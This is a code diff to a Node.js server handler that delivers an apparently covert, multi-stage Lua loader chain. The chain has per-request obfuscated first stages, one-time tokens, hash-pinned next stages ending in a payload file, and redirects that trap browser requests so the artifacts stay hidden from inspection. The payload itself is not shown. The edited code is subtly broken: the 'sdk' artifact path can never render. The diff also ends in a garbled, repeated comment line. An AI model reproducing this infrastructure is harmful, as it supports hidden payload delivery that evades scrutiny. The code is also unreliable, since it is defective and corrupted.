@@ -34,7 +34,7 @@ const ARTIFACT_FILES = Object.freeze({
   payload: 'payload.lua',
   sdk: '999MS-sdk.lua',
 });
-const STAGE_TWO_RAW_SHA256 = '451f73c9f050c4a4b5b5816533d912c6761d4754e74904a09de93316da0261ce';
+const STAGE_TWO_RAW_SHA256 = '43e8670a044857d613811b9f3863471c0affd89286959981c237461dfe2cb5cc';
 
 // ═══ Rate limit ═══
 const rateLimit = new Map();
@@ -282,11 +282,6 @@ module.exports = async function handler(req, res) {
 
   // loadc is generated per request and is the only stage that mints a path
   // capability. The remaining legacy artifacts keep their static handoffs.
-  if (action === 'stage-pickup') {
-    if (trapBrowserArtifacts() && isBrowserRequest(req)) return trapRedirect(res);
-    return handleStagePickup(req, res, url);
-  }
-
   if (action === 'artifact') {
     if (req.method !== 'GET') return rejectOrTrap(req, res, 405);
     if (trapBrowserArtifacts() && isBrowserRequest(req)) return trapRedirect(res);
@@ -412,38 +407,55 @@ function renderLoaderArtifact() {
 }
 
 // ═══ Stage rendering ═══
-// Bodies are deterministic for a host, so a stage can pin the exact bytes of
-// the next one. The *link* to the next stage is not embedded: it is minted
-// when the client asks for it (see /api/stage-pickup).
+// Bodies are deterministic for a host and a token, so a stage can pin the exact
+// bytes of the next one. The next-stage link is minted while serving a stage
+// and written straight into that stage's body.
 const sha256 = (text) => crypto.createHash('sha256').update(text).digest('hex');
 
-function renderStage(name, baseUrl, nextSha) {
+function renderStage(name, baseUrl, nextUrl, nextSha) {
   const raw = name === 'loader' ? renderLoaderArtifact() : readArtifact(name);
   if (typeof raw !== 'string') return null;
   let body = applyChainTokens(raw, baseUrl);
+  if (typeof nextUrl === 'string' && nextUrl) body = body.replaceAll('@NEXT@', nextUrl);
   if (typeof nextSha === 'string' && nextSha) body = body.replaceAll('@NEXT_SHA@', nextSha);
   return body;
 }
 
-// Resolved lazily and cached per host: it is pure text templating.
-const renderedCache = new Map();
-function stageBody(name, baseUrl) {
+// Raw templates, cached per host. Substitution happens per request because the
+// next-stage link changes every time.
+const rawBodyCache = new Map();
+function stageTemplate(name, baseUrl) {
   const key = `${name}|${baseUrl}`;
-  if (renderedCache.has(key)) return renderedCache.get(key);
+  if (rawBodyCache.has(key)) return rawBodyCache.get(key);
   let body = null;
   if (name === 'payload') {
     body = renderStage('payload', baseUrl);
-  } else if (name === 'loader') {
-    const payloadBody = stageBody('payload', baseUrl);
-    body = payloadBody ? renderStage('loader', baseUrl, sha256(payloadBody)) : null;
-  } else if (name === 'loada') {
-    const loaderBody = stageBody('loader', baseUrl);
-    body = loaderBody ? renderStage('loada', baseUrl, sha256(loaderBody)) : null;
-  } else if (name === 'sdk') {
-    body = applyChainTokens(readArtifact('sdk'), baseUrl);
+  } else if (name !== 'sdk') {
+    body = renderStage(name === 'sdk' ? 'sdk' : name, baseUrl);
   }
-  if (typeof body === 'string') renderedCache.set(key, body);
+  if (typeof body === 'string') rawBodyCache.set(key, body);
   return body;
+}
+
+// Walks the chain from any token: the next link is derived from the current
+// one, so every stage body (and its hash) can be produced up front.
+function renderChain(baseUrl, token, depth = 0) {
+  if (depth > 4) return null;
+  const claim = chainLinks.resolveToken(token);
+  if (!claim) return null;
+
+  if (claim.stage === 'payload') {
+    const body = renderStage('payload', baseUrl);
+    return body ? { stage: 'payload', body, sha: sha256(body) } : null;
+  }
+
+  const next = chainLinks.deriveNext(token);
+  if (!next) return null;
+  const downstream = renderChain(baseUrl, next.token, depth + 1);
+  if (!downstream) return null;
+
+  const body = renderStage(claim.stage, baseUrl, `${baseUrl}/${next.token}`, downstream.sha);
+  return body ? { stage: claim.stage, body, sha: sha256(body) } : null;
 }
 
 async function serveArtifact(req, res, name, url, origin) {
@@ -452,14 +464,14 @@ async function serveArtifact(req, res, name, url, origin) {
 
   // Stage 1: a fresh Stage-2 link, obfuscated per request.
   if (name === 'loadc') {
-    const loadaBody = stageBody('loada', baseUrl);
-    if (!loadaBody) return res.status(503).send('');
     const link = chainLinks.mintLink('loada', Date.now(), obfuscationBudgetMs());
     if (!link) return res.status(503).send('');
+    const run = renderChain(baseUrl, link.token);
+    if (!run) return res.status(503).send('');
     const template = fs.readFileSync(path.join(process.cwd(), 'artifacts', 'loadc.lua'), 'utf8');
     const rendered = template
       .replaceAll('__STAGE2_TOKEN__', link.token)
-      .replaceAll('__STAGE2_SHA256__', sha256(loadaBody))
+      .replaceAll('__STAGE2_SHA256__', run.sha)
       .replaceAll('__BASE_URL__', baseUrl);
     const obfuscated = await obfuscateStageOne(rendered);
     if (!obfuscated) return res.status(503).send('');
@@ -478,8 +490,9 @@ async function serveArtifact(req, res, name, url, origin) {
     const token = req.query?.t || url.searchParams.get('t');
     const claim = chainLinks.consume(token);
     if (!claim) return rejectOrTrap(req, res);
-    const body = stageBody(claim.stage, baseUrl);
-    if (typeof body !== 'string') return res.status(503).send('');
+    const run = renderChain(baseUrl, token);
+    if (!run) return res.status(503).send('');
+    const body = run.body;
     res.setHeader('Content-Type', 'text/plain; charset=utf-8');
     res.setHeader('Cache-Control', 'no-store');
     return res.status(200).send(body);
@@ -487,7 +500,7 @@ async function serveArtifact(req, res, name, url, origin) {
 
   if (name === 'sdk') {
     try {
-      const body = stageBody('sdk', baseUrl);
+      const body = stageTemplate('sdk', baseUrl);
       if (typeof body !== 'string') return res.status(503).send('');
       res.setHeader('Content-Type', 'text/plain; charset=utf-8');
       res.setHeader('Cache-Control', 'no-store');
@@ -499,30 +512,6 @@ async function serveArtifact(req, res, name, url, origin) {
   }
 
   return rejectOrTrap(req, res);
-}
-
-// ═══ /api/stage-pickup ═══
-// The client redeemed a stage link; hand it a freshly minted link for the next
-// stage. The presented token proves the chain reached this point, and may be
-// used for a pickup exactly once.
-function handleStagePickup(req, res, url) {
-  if (req.method !== 'GET') return rejectOrTrap(req, res, 405);
-  const token = req.query?.t || url.searchParams.get('t');
-  const want = req.query?.want || url.searchParams.get('want');
-
-  if (want !== 'loader' && want !== 'payload') return rejectOrTrap(req, res);
-
-  const claim = chainLinks.claimPickup(token, want);
-  if (!claim) {
-    noteEvent('chain_reject', `pickup -> ${want}`);
-    return rejectOrTrap(req, res);
-  }
-
-  const link = chainLinks.mintLink(want);
-  if (!link) return res.status(503).send('');
-  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
-  res.setHeader('Cache-Control', 'no-store');
-  return res.status(200).send(link.token);
 }
 
 // ═══ /api/verify ═══// ═══ /api/verify ═══// ═══ /api/verify ═══
